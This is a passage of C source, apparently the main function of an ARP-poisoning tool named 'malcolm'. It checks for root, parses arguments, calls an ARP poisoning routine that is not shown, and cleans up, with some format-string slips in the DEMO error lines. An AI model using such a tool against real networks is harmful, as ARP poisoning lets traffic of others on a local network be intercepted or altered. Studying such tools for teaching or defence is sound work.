    uint8_t                  u8_lcl_return_from_function;
    void                    *ptr_vd_lcl_signal_handler_return_from_sunction;
    uid_t                    estc_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    estc_lcl_return_from_function                  = 1;
    cstc_lcl_malcolm_data.u8_global_status_        = 0;
    ptr_vd_lcl_signal_handler_return_from_sunction = SIG_ERR;
    u8_lcl_return_from_function                    = 0;

    /**
    * Setting the actual structure malcolm data to the global address to malcolm data for exit when the signal SIGINT is receved
    */
    ptr_cstc_gbl_malcolm_data = &cstc_lcl_malcolm_data;

    /**
    * Setting the exit function when the signal SIGINT is receved
    */
    ptr_vd_lcl_signal_handler_return_from_sunction = SIG_ERR;
    ptr_vd_lcl_signal_handler_return_from_sunction = signal(SIGINT, Fv__close_all_data_and_exit);

    /**
    * Check if function to set the exit function when the signal SIGINT is receved succeeded
    */
    if(ptr_vd_lcl_signal_handler_return_from_sunction == SIG_ERR)
        {
        /**
        * Treat the case when the function to set the exit function when the signal SIGINT is receved failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the exit function when the signal SIGINT is receved failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to set the exit function when the signal SIGINT is receved failed
        */
        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to set the exit function when the signal SIGINT is receved succeeded
        */
        }

    estc_lcl_return_from_function = 1;
    estc_lcl_return_from_function = getuid();

    /**
    * Check if the user have not root privilege
    */
    if(estc_lcl_return_from_function != 0)
        {
        /**
        * Treat the case when the user have not root privilege
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the user have not root privilege\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the user have not root privilege
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the user have root privilege
        */
        } 

    /**
    * Initialize the structure malcolm data
    */
    cstc_lcl_malcolm_data.u8_global_status_ = 0;
    u8_lcl_return_from_function             = RETURN_FAILURE;
    u8_lcl_return_from_function             = Fu8__init_structure_malcolm_data(&cstc_lcl_malcolm_data);

    /**
    * Check if function to init the structure malcolm data succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to init the structure malcolm data failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to init the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to init the structure malcolm data failed
        */
        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to init the structure malcolm data succeeded
        */
        } 

    /**
    * Load the data form the argument of the program
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__load_data_from_argument(&(cstc_lcl_malcolm_data.sstc_program_argument_), s32_pssd_program_argument_number - 1, (uint8_t **) (dbl_ptr_s8_pssd_program_arguments + 1));

    /**
    * Check if function to load the data form the argument of the program succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to load the data form the argument of the program failed
        */

        #ifdef DEVELOPEMENT
        ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to load the data form the argument of the program failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Closing the structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

        /**
        * Check if function to close the structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure malcolm data failed
            */
            return (EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure malcolm data succeeded
            */
            }

        /**
        * Return failure to indicate the function to load the data form the argument of the program failed
        */
        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to load the data form the argument of the program succeeded
        */
        }

    /**
    * Check if argument error occur
    */
    if((cstc_lcl_malcolm_data.sstc_program_argument_.u8_global_status_ & SECOND_BIT) != FALSE)
        {
        /**
        * Treat the case when argument error occur
        */

        /**
        * Closing the structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

        /**
        * Check if function to close the structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure malcolm data failed
            */
            return (EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure malcolm data succeeded
            */
            }

        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when no argument error occur
        */
        }

    /**
    * Check if the option help is set
    */
    if(cstc_lcl_malcolm_data.sstc_program_argument_.u8_simple_options_[MALCOLM_HELP] != FALSE)
        {
        /**
        * Treat the case when the option help is set
        */

        /**
        * Closing the structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

        /**
        * Check if function to close the structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure malcolm data failed
            */
            return (EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure malcolm data succeeded
            */
            }

        /**
        * Display the help
        */
        (void) fv__help();

        return (EXIT_SUCCESS);
        }
    else
        {
        /**
        * Treat the case when the option help is not set
        */
        }

    /**
    * Getting the value from the argument data
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_value_from_argument_data(&cstc_lcl_malcolm_data);

    /**
    * Check if function to get the value from the argument data succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get the value from the argument data failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the value from the argument data failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Closing the structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

        /**
        * Check if function to close the structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure malcolm data failed
            */
            return (EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure malcolm data succeeded
            */
            }

        /**
        * Return failure to indicate the function to get the value from the argument data failed
        */
        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the value from the argument data succeeded
        */
        }

    /**
    * Making the arp poisoning
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__make_arp_poisoning(&cstc_lcl_malcolm_data);

    /**
    * Check if function to make the arp poisoning succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to make the arp poisoning failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to make the arp poisoning failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Closing the structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

        /**
        * Check if function to close the structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure malcolm data failed
            */
            return (EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure malcolm data succeeded
            */
            }

        /**
        * Return failure to indicate the function to make the arp poisoning failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to make the arp poisoning succeeded
        */
        }

    (void) Fv__display_structure_malcolm_data(&cstc_lcl_malcolm_data);

    /**
    * Closing the structure malcolm data
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(&cstc_lcl_malcolm_data);

    /**
    * Check if function to close the structure malcolm data succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to close the structure malcolm data failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to close the structure malcolm data failed
        */
        return (EXIT_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to close the structure malcolm data succeeded
        */
        }

    return (EXIT_SUCCESS);
    }
